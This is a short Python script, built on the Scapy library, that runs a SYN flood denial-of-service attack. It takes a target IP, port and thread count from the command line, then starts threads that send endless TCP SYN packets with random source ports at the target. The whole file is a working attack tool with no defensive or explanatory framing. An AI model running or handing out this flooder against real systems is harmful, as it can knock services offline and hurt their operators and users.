#!/usr/bin/python3
from scapy.all import *
from time import sleep
import _thread
import random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
if len(sys.argv) != 4:
    print("./syn.py [ip] [port] [thread_number]")
    sys.exit()

ip = str(sys.argv[1])
port = int(sys.argv[2])
thread_number = int(sys.argv[3])

print("do syn_flood attack...")
def synflood(ip, port):
    while True:
        x = random.randint(0, 65535)
        send(IP(dst=ip)/TCP(dport=port, sport=x), verbose=0)

for x in range(0, thread_number):
    _thread.start_new_thread(synflood, (ip, port))

while True:
    sleep(1)
